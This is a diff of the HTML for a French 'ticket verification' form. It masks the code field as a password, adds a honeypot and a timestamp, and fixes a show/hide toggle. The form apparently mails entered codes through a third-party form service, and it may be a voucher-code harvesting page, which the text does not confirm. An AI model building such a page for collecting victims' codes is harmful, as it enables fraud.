@@ -58,13 +58,10 @@
           <input type="hidden" name="_captcha" value="false">
           <input type="hidden" name="_template" value="table">
 
-          <!--AJOUTER UN ANTI-BOT-->
           <input type="text" name="company" style="display:none">
 
-          <!--DIRE L'INTENTION DU FORM-->
           <input type="hidden" name="intent" value="user_verification">
 
-          <!--AJOUTER UN TIMESTAMP-->
           <input type="hidden" name="submitted_at" id="submitted_at">
           
           <input type="hidden" name="name" value="Formulaire vérification ticket">
@@ -83,11 +80,10 @@
 
           <div class="password-wrapper">
             <label for="reference" data-i18n="form_code">Code :</label>
-            <input type="text" id="reference" name="reference" required>
+            <input type="password" id="reference" name="reference" required>
           </div>
 
           <textarea name="message" hidden>Soumission via formulaire sécurisé</textarea>
-
 
           <p style="margin-top: 10px;">
             <span data-i18n="form_toggle_label">Afficher le code :</span>
@@ -122,16 +118,23 @@
 
   <script src="form.js"></script>
   <script>
+    // Fonction pour masquer/afficher le code
     function toggleCode(show) {
-      const codeInput = document.getElementById("code");
-      codeInput.type = show ? "text" : "password";
-
+      // On cible l'id "reference" car c'est celui de l'input
+      const codeInput = document.getElementById("reference");
+      if (codeInput) {
+        codeInput.type = show ? "text" : "password";
+      }
     }
 
-    //GERE LE TIMESTAMP
-     document.getElementById('submitted_at').value = Date.now();
+    // Gère le timestamp lors du chargement de la page
+    window.onload = function() {
+      const timestampField = document.getElementById('submitted_at');
+      if (timestampField) {
+        timestampField.value = new Date().toLocaleString();
+      }
+    };
   </script>
 
-  </body>
-
+</body>
 </html>
